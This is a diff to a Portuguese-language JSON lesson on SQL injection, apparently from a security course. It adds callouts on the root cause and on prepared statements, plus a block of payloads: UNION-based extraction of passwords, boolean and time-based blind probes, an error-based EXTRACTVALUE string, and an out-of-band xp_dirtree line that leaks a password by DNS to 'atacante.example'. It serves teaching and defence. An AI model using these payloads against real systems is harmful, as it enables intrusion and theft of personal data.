@@ -28,6 +28,10 @@
           "language": "sql",
           "code": "-- Código vulnerável (PHP):\n$query = \"SELECT * FROM users WHERE username = '\" . $_POST['user'] . \"' AND password = '\" . $_POST['pass'] . \"'\";\n\n-- Entrada normal:\n-- user: joao  pass: senha123\n-- SQL: SELECT * FROM users WHERE username = 'joao' AND password = 'senha123'\n\n-- Entrada maliciosa (bypass de autenticação):\n-- user: admin'--  pass: qualquer_coisa\n-- SQL: SELECT * FROM users WHERE username = 'admin'-- ' AND password = '...'  \n-- O -- comenta o resto → autentica como admin SEM verificar senha!"
         },
+        "callout": {
+          "type": "danger",
+          "text": "A causa raiz não é a falta de sanitização, é a mistura de código e dado na mesma string. Enquanto a consulta for montada por concatenação, cada nova filtragem de caracteres é uma corrida contra formas de codificação que ninguém previu. Prepared statements eliminam a classe inteira do problema porque a estrutura da consulta é enviada ao banco antes dos dados."
+        },
         "keyPoints": [
           "SQLi mais simples: inserir aspas simples ' para causar erro e confirmar vulnerabilidade",
           "Bypass de autenticação: ' OR '1'='1 faz WHERE sempre verdadeiro",
@@ -42,6 +46,10 @@
           "type": "warning",
           "text": "Sistemas de gestão acadêmica (matrícula, histórico, notas, portal do aluno) frequentemente contêm SQLi não descoberta por anos. Uma SQLi em sistema de matrícula pode expor dados pessoais de todos os alunos (CPF, endereço, histórico) — dado pessoal sensível sob a LGPD."
         },
+        "codeBlock": {
+          "language": "sql",
+          "code": "-- UNION-BASED: extrai dados de outras tabelas\n-- entrada: ' UNION SELECT username, password FROM users --\nSELECT nome, email FROM alunos WHERE id = ''\n  UNION SELECT username, password FROM users --';\n\n-- BLIND BOOLEANA: infere caractere a caractere pela resposta\n-- página muda quando a condição é verdadeira\n' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --\n' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='b' --\n\n-- BLIND POR TEMPO: quando nem a resposta muda\n-- se a página demorar 5s, a condição é verdadeira\n'; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '0:0:5' --\n' AND (SELECT SLEEP(5) FROM users WHERE username='admin') --\n\n-- ERROR-BASED: força o SGBD a vazar dado na mensagem de erro\n' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT database()),0x7e)) --\n\n-- OUT-OF-BAND: exfiltra por DNS quando não há resposta visível\n'; EXEC master..xp_dirtree '\\\\\\\\'+(SELECT TOP 1 password\n   FROM users)+'.atacante.example\\\\a' --\n\n-- SEGUNDA ORDEM: a carga é gravada agora e executada depois\n-- cadastro:  nome = admin'--\n-- mais tarde, outra rotina concatena esse nome numa query\n\n-- Por que blind importa: a ausência de mensagem de erro na\n-- tela NÃO indica que a aplicação está protegida. Blind por\n-- tempo funciona mesmo com erro totalmente suprimido."
+        },
         "keyPoints": [
           "SQLi em sistema de gestão acadêmica pode expor dados de todos os alunos",
           "Blind SQLi é mais difícil de detectar manualmente — scanners automatizados (SQLMap) ajudam",
@@ -55,6 +63,10 @@
         "codeBlock": {
           "language": "sql",
           "code": "-- VULNERÁVEL: concatenação direta\n$query = \"SELECT * FROM users WHERE username = '\" . $user . \"'\";\n\n-- SEGURO: Prepared Statement (PHP PDO)\n$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ?');\n$stmt->execute([$user]);\n\n-- SEGURO: Named parameters\n$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :user');\n$stmt->execute(['user' => $user]);"
+        },
+        "callout": {
+          "type": "tip",
+          "text": "Prepared statements protegem valores, não identificadores. Nome de tabela, nome de coluna e direção de ordenação não podem ser parametrizados — se vierem do usuário, valide contra uma lista fechada de valores permitidos. É por aí que passa boa parte das SQLi que sobrevivem em código já migrado."
         },
         "keyPoints": [
           "Prepared Statements são a única defesa definitiva — filtros e escape são complementos",
